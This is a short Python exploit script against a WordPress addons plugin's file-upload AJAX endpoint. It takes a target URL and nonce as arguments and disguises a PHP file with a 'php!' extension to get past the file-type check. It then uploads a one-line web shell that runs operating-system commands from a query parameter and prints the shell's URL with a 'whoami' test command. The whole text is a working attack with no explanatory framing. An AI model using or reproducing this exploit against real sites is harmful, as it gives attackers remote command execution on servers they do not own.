import requests
import sys
import json
# get url from argument
url = sys.argv[1]
nonce = sys.argv[2]

url = url+"/wp-admin/admin-ajax.php"

# post request with content type multipart form data
data = {"action": "wpr_addons_upload_file", "triggering_event":"click", "allowed_file_types":"php!", "wpr_addons_nonce":nonce}
resp = requests.post(url=url, data=data, files={"uploaded_file": ("x.php!", "<?php system($_GET['cmd']); ?>", "text/php")})
# get the uploaded file path
print(json.loads(resp.text)["data"].get('url')+ "?cmd=whoami")